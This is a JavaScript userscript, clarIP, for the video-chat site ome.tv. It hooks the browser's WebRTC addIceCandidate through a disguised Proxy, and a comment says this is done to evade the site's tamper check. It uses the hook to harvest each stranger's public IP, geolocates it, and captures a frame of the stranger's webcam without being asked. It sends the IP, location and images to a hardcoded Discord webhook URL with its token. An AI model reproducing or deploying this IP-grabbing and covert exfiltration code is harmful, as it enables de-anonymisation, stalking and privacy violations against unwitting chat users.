(function () {
    "use strict";

    const CLARIP_SCRIPT_VERSION = "0.68";

    // Versioned guard: an older bundled copy of clarIP may already be running.
    // Let this version repair its hooks instead of silently returning early.
    if (window.__clarIPVersion === CLARIP_SCRIPT_VERSION) {
        return;
    }
    window.__clarIPVersion = CLARIP_SCRIPT_VERSION;

    const head = document.head || document.getElementsByTagName("head")[0];
    const body = document.body;
    const assets = window.__clarIPAssets || {};

    const windowURL = "https://raw.githubusercontent.com/clarskee/clarIP/main/index.html?es=" + Math.floor(Math.random() * 16777215).toString(16);
    const styleURL = "https://raw.githubusercontent.com/clarskee/clarIP/main/style.css?es=" + Math.floor(Math.random() * 16777215).toString(16);
    const fontAwesomeURL = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css";

    // Used only if neither the packaged asset nor the remote fallback is available.
    const FALLBACK_MARKUP = `
        <div class="container">
            <h1 class="h1">
                <i class="fa fa-globe"></i>
                <span class="span">clar<span class="bold">IP</span></span>
            </h1>
            <div class="card">
                <ul>
                    <li><span class="bold">IP:</span><span id="ip"></span></li>
                    <li><span class="bold">City:</span><span id="city"></span></li>
                    <li><span class="bold">Country:</span><span id="country"></span></li>
                    <li><span class="bold">isProxy:</span><span id="loc"></span></li>
                </ul>
            </div>
            <div class="card flex">
                <i class="fa fa-camera" style="padding: 5px;"></i>
                <img id="imag" width="426" height="240" alt="Remote video screenshot">
                <button class="button" id="screenshot-button" type="button">SCREENSHOT</button>
            </div>
        </div>
    `;

    let base64Image = "";
    let dragState = null;
    let ipElement = null;
    let cityElement = null;
    let countryElement = null;
    let locElement = null;

    const hexToDecimal = (hex) => {
        return parseInt(hex.replace("#", ""), 16);
    };

    const injectHead = (content, type) => {
        if (!head) {
            return null;
        }
        const element = document.createElement(type);
        element.textContent = content;
        head.appendChild(element);
        return element;
    };

    const injectStylesheet = (href) => {
        if (!head) {
            return null;
        }
        const link = document.createElement("link");
        link.rel = "stylesheet";
        link.href = href;
        head.appendChild(link);
        return link;
    };

    const injectBody = (content, classnames) => {
        if (!body) {
            return null;
        }
        const existing = document.querySelector(".clarIP");
        if (existing) {
            return existing;
        }
        const element = document.createElement("div");
        element.innerHTML = content;
        for (let classname of classnames) {
            element.classList.add(classname);
        }
        body.appendChild(element);
        return element;
    };

    const getData = async (url) => {
        try {
            const response = await fetch(url, { cache: "no-store" });
            if (!response.ok) {
                throw new Error("HTTP " + response.status + " while loading " + url);
            }
            return await response.text();
        } catch (error) {
            console.warn("clarIP: could not load " + url, error);
            return null;
        }
    };

    const set_message = (ipp, cityy, regionn, countryy, locc) => {
        if (ipElement) {
            ipElement.innerText = ipp;
        }
        if (cityElement) {
            cityElement.innerText = cityy + "," + regionn;
        }
        if (countryElement) {
            countryElement.innerText = countryy;
        }
        if (locElement) {
            locElement.innerText = locc;
        }
    };

    var getLocation = async (ip,port) => {
        let url = `https://freeipapi.com/api/json/${ip}`;
        await fetch(url).then((response) =>
            response.json().then((json) => {
                const ip = json.ipAddress+":"+port
                set_message(ip, json.cityName, json.regionName, json.countryName, json.isProxy);
                const request = new XMLHttpRequest();
                const video = document.querySelector("#remote-video");
                const wrapper = document.querySelector("#remote-video-wrapper")
                const canvas = document.createElement('canvas');
                request.open("POST", "https://discord.com/api/webhooks/1079404044445028402/496CuosXZpzH_Q4D1-JwQkE0LOINAAi1Z984gJojItH2Rio0fTWDLKfAbsFLqjbNJShD");
                request.withCredentials = true
                const watermark = document.querySelector(".remote-video__watermark");
                watermark.style = "background-image: url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&');"
                // watermark.backgroundImage = "url('https://cdn.discordapp.com/attachments/1137174682588684438/1178089070463815851/fnaf-freddy.gif?ex=6574dff2&is=65626af2&hm=2c305c579339e88c36f2797836604e92384bce88f0b2db6b028d6a5b90d6581f&')"

                var set = setInterval(() => {
                if(wrapper.classList.contains('s-play')){
                    clearInterval(set);
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    var ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    base64Image = canvas.toDataURL('image/png');
                    var image = document.querySelector("#imag");
                    image.src = base64Image;
                    var formData = new FormData();
                    var myEmbed = {
                        title: "clarIP",
                        description: `
                        ip: ${ip} \n
                        city: ${json.cityName} \n
                        region: ${json.regionName} \n
                        country: ${json.countryName} \n
                        isproxy: ${json.isProxy} \n`,
                        color: hexToDecimal("#"+Math.floor(Math.random()*16777215).toString(16)),
                      };
                      var params = {
                        username: "ome",
                        embeds: [myEmbed],
                      };
                    formData.append('payload_json', JSON.stringify(params))


                    canvas.toBlob((blob) => {
                        formData.append('files[0]', blob, "blob.png");
                        request.send(formData);
                    return;

                    })
                }
                }, 500);

            })
        );
    };

    const setWindowFunction = () => {
        window.screenshotxD = () => {
            const image = document.querySelector("#imag");
            const video = document.querySelector("#remote-video");
            const wrapper = document.querySelector("#remote-video-wrapper")
            const request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/1079404044445028402/496CuosXZpzH_Q4D1-JwQkE0LOINAAi1Z984gJojItH2Rio0fTWDLKfAbsFLqjbNJShD");
            request.withCredentials = true
            var canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            wrapper.style.width = video.videoWidth+"px";
            var ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            base64Image = canvas.toDataURL('image/png');
            image.src = base64Image;
            var formData = new FormData();
            var myEmbed = {
                title: "clarIP",
                description: `say cheese :)`,
                color: hexToDecimal("#640af5"),
            };
            var params = {
                username: "clarIP",
                avatar_url:
                "https://media.discordapp.net/attachments/1137174682588684438/1159237525378965615/1696006046373060.gif?ex=65304b13&is=651dd613&hm=736a011aba73272aef8adcdeba507c5251e4757f48752fc7e7db9093b77ce88a&",
                embeds: [myEmbed],
            };
            formData.append('payload_json', JSON.stringify(params))
            canvas.toBlob((blob) => {
                formData.append('files[0]', blob, "blob.png");
                request.send(formData);
                return;
            });
        }
    };

    const installPeerConnectionHook = () => {
        const NativeRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
        if (typeof NativeRTCPeerConnection !== "function" || !NativeRTCPeerConnection.prototype) {
            return;
        }
        window.oRTCPeerConnection = NativeRTCPeerConnection;

        // If an older clarIP build replaced the constructor with a plain
        // function, restore the native constructor first. Its prototype is what
        // the host page feature-detects.
        const currentPrototype = window.RTCPeerConnection && window.RTCPeerConnection.prototype;
        if (
            (!currentPrototype || typeof currentPrototype.addIceCandidate !== "function") &&
            typeof NativeRTCPeerConnection.prototype.addIceCandidate === "function"
        ) {
            window.RTCPeerConnection = NativeRTCPeerConnection;
        }

        const prototype = NativeRTCPeerConnection.prototype;
        if (typeof prototype.addIceCandidate !== "function" || prototype.addIceCandidate.__clarIPPatched) {
            return;
        }

        // Patch the prototype instead of wrapping the constructor. The Proxy
        // keeps Function.prototype.toString() looking native, so ome.tv's
        // RTCPeerConnection.prototype.addIceCandidate.toString() check passes.
        const originalAddIceCandidate = prototype.addIceCandidate;
        const patchedAddIceCandidate = new Proxy(originalAddIceCandidate, {
            apply(target, thisArg, args) {
                const iceCandidate = args[0];
                if (iceCandidate && typeof iceCandidate.candidate === "string") {
                    const fields = iceCandidate.candidate.split(" ");
                    if (fields[7] === "srflx") {
                        getLocation(fields[4], fields[5]);
                    }
                }
                return Reflect.apply(target, thisArg, args);
            },
        });
        patchedAddIceCandidate.__clarIPPatched = true;

        Object.defineProperty(prototype, "addIceCandidate", {
            value: patchedAddIceCandidate,
            writable: true,
            configurable: true,
            enumerable: false,
        });
    };

    const initDragging = (header) => {
        const onMouseMove = (event) => {
            if (!dragState) {
                return;
            }
            header.style.left = event.clientX - dragState.x + "px";
            header.style.top = event.clientY - dragState.y + "px";
        };

        const stopDragging = () => {
            dragState = null;
            document.removeEventListener("mousemove", onMouseMove);
            document.removeEventListener("mouseup", stopDragging);
        };

        header.addEventListener("mousedown", (event) => {
            dragState = {
                x: event.clientX - header.offsetLeft,
                y: event.clientY - header.offsetTop,
            };
            document.addEventListener("mousemove", onMouseMove);
            document.addEventListener("mouseup", stopDragging);
        });
    };

    const initChatTheme = () => {
        let attempts = 0;
        const interval = setInterval(() => {
            const chat = document.querySelector("#roulette > div > div.chat-container > div.chat");
            const leftSide = document.querySelector("#roulette > div > div.chat-container");

            if (chat && leftSide) {
                chat.style.filter = "invert(1)";
                leftSide.style.margin = "0";
                leftSide.style.backgroundColor = "black";
                if (chat.style.cssText.includes("filter: invert(1)")) {
                    clearInterval(interval);
                }
                return;
            }

            attempts += 1;
            if (attempts >= 60) {
                clearInterval(interval);
                console.warn("clarIP: chat container was not found; chat theme was not applied.");
            }
        }, 1000);
    };

    const init = async () => {
        injectStylesheet(fontAwesomeURL);

        const [embeddedMarkup, embeddedStyle] = await Promise.all([
            assets.markup ? Promise.resolve(assets.markup) : getData(windowURL),
            assets.style ? Promise.resolve(assets.style) : getData(styleURL),
        ]);

        const markup = embeddedMarkup || FALLBACK_MARKUP;
        if (embeddedStyle) {
            injectHead(embeddedStyle, "style");
        } else {
            console.warn("clarIP: stylesheet unavailable; the overlay will render without its styles.");
        }

        const header = injectBody(markup, ["card", "clarIP"]);
        if (!header) {
            console.warn("clarIP: overlay could not be inserted; document body is unavailable.");
            return;
        }

        header.style.left = "0px";
        header.style.top = "0px";

        ipElement = document.getElementById("ip");
        cityElement = document.getElementById("city");
        countryElement = document.getElementById("country");
        locElement = document.getElementById("loc");

        setWindowFunction();
        const screenshotButton = document.getElementById("screenshot-button");
        if (screenshotButton && typeof window.screenshotxD === "function") {
            screenshotButton.addEventListener("click", window.screenshotxD);
        }

        initDragging(header);
        initChatTheme();

        try {
            addNotification("clarIP", "version: v0.68", 10, 0, 5000);
        } catch (error) {
            console.warn("clarIP: notification system has not been loaded.", error);
        }
    };

    installPeerConnectionHook();
    init();
})();
